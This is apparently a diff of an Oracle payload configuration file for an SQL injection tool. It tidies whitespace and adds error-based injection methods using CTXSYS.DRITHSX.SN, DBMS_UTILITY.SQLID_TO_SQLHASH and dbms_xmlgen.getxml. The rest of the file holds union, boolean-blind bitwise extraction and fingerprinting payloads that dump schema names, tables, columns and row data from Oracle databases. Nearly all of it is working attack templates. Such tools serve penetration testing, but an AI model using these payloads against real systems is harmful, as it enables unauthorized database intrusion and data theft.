@@ -1,17 +1,19 @@
 vendor: Oracle
 
-resource: 
+resource:
  info: |
-  SELECT 
+  SELECT
       version
-      || '${enclose_value_sql}' 
-      || SYS.DATABASE_NAME 
-      || '${enclose_value_sql}' 
-      || user 
+      || '${enclose_value_sql}'
+      || SYS.DATABASE_NAME
+      || '${enclose_value_sql}'
+      || user
       || '${trail_sql}'
   FROM v%24instance
-  
- schema: 
+
+ schema:
+  # TODO Use sys.stragg instead of XmlAgg
+  # select sys.stragg (distinct username||chr(32)) from all_users
   database: |
    select
        utl_raw.cast_to_varchar2(
@@ -40,7 +42,7 @@ resource:
            )
        )
    from (
-       select t.s 
+       select t.s
        from
            (SELECT DISTINCT owner s FROM all_tables) t,
            (SELECT DISTINCT owner s FROM all_tables) t1
@@ -48,7 +50,7 @@ resource:
        group by t.s
        ${limit}
    )
-   
+
   table: |
    select
        utl_raw.cast_to_varchar2(
@@ -78,15 +80,15 @@ resource:
            )
        )
    from (
-       select t.s 
-       from 
+       select t.s
+       from
            (SELECT DISTINCT table_name s FROM all_tables where owner = '${database}') t,
            (SELECT DISTINCT table_name s FROM all_tables where owner = '${database}') t1
        where t.s >= t1.s
        group by t.s
        ${limit}
    )
-   
+
   column: |
    select
        utl_raw.cast_to_varchar2(
@@ -116,7 +118,7 @@ resource:
            )
        )
    from (
-       select t.s 
+       select t.s
        from
            (SELECT DISTINCT column_name s FROM all_tab_columns where owner = '${database}' and table_name = '${table}') t,
            (SELECT DISTINCT column_name s FROM all_tab_columns where owner = '${database}' and table_name = '${table}') t1
@@ -124,8 +126,8 @@ resource:
        group by t.s
        ${limit}
    )
-   
-  row: 
+
+  row:
    query: |
     select
         utl_raw.cast_to_varchar2(
@@ -155,20 +157,20 @@ resource:
             )
         )
     from (
-        select t.s 
-        from 
+        select t.s
+        from
             (SELECT DISTINCT ${fields} s FROM ${database}.${table}) t,
-            (SELECT DISTINCT ${fields} s FROM ${database}.${table}) t1 
+            (SELECT DISTINCT ${fields} s FROM ${database}.${table}) t1
         where t.s >= t1.s
         group by t.s
         ${limit}
     )
-   fields: 
+   fields:
     field: trim(to_char(${field.value}))
     concat: "|| '%7f' ||"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
    (
        select
@@ -183,42 +185,43 @@ strategy:
   failsafe: to_char(1337${indice}7330%2b1)
   calibrator: |
    rpad(
-       '${calibrator_sql}', 
-       1024, 
+       '${calibrator_sql}',
+       1024,
        '${calibrator_sql}'
-   ) s
+   )
   limitBoundary: 1
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - function.oci
     - "Warning: oci_parse()"
     - "Warning: oci_execute()"
     - "Warning: oci_fetch_array()"
     - Unclosed quotation mark after the character string '
-    
- normal: 
+
+ normal:
   indices: union select ${indices} from dual
   capacity: |
    (
-       SELECT 
-           '${lead}' 
-           || ${indice} 
-           || ${calibrator} 
+       SELECT
+           '${lead}'
+           || ${indice}
+           || ${calibrator}
+           s
        FROM dual
    )
   orderBy: order by 1337
-  
- boolean: 
-  test: 
-   falses: 
+
+ boolean:
+  test:
+   falses:
     - 1 = 0
     - "'a' %21= 'a'"
     - "'b' %21= 'b'"
     - 1 = 2
     - 1 %21= 1
     - 2 %21= 2
-   trues: 
+   trues:
     - 0 = 0
     - "'a' %21= 'b'"
     - "'a' = 'a'"
@@ -230,14 +233,86 @@ strategy:
     0 != BITAND(
         ascii(
             substr(
-                ${injection}, 
-                ${window.char}, 
+                ${injection},
+                ${window.char},
                 1
             )
-        ), 
+        ),
         ${bit}
     )
    length: length(${injection}) > ${window.char}
   modeAnd: and
   modeOr: or
   blind: ${boolean.mode} ${test}
+  
+ error:
+  method:
+  
+   - name: DRITHSX.SN:Stack
+     query: |
+      ; select CTXSYS.DRITHSX.SN(1,(
+          ${window}
+      )) from dual
+     # TODO Add to SQLEngine
+     capacity: 481
+  
+   - name: DRITHSX.SN:OR
+     query: |
+      OR 1=CTXSYS.DRITHSX.SN(1,(
+          ${window}
+      ))
+     # TODO Add to SQLEngine
+     capacity: 481
+  
+   - name: DRITHSX.SN:AND
+     query: |
+      AND 1=CTXSYS.DRITHSX.SN(1,(
+          ${window}
+      ))
+     capacity: 481
+     
+   - name: SQLHASH:OR
+     query: |
+      OR 1=DBMS_UTILITY.SQLID_TO_SQLHASH(
+          ${window}
+      )
+     # TODO Add to SQLEngine
+     capacity: 2004
+     
+   - name: SQLHASH:Stack
+     query: |
+      ; select DBMS_UTILITY.SQLID_TO_SQLHASH(
+          ${window}
+      ) from dual
+     # TODO Add to SQLEngine
+     capacity: 2004
+  
+   - name: SQLHASH:AND
+     query: |
+      AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH(
+          ${window}
+      )
+     capacity: 2004
+     
+   - name: GETXML:Stack
+     query: |
+      ;select to_char(dbms_xmlgen.getxml('select "'||(
+          ${window}
+      )||'" FROM sys.dual')) from dual
+     # TODO Add to SQLEngine
+     capacity: 124
+     
+   - name: GETXML:OR
+     query: |
+      OR 1=to_char(dbms_xmlgen.getxml('select "'||(
+          ${window}
+      )||'" FROM sys.dual'))
+     # TODO Add to SQLEngine
+     capacity: 124
+  
+   - name: GETXML:AND
+     query: |
+      AND 1=to_char(dbms_xmlgen.getxml('select "'||(
+          ${window}
+      )||'" FROM sys.dual'))
+     capacity: 124
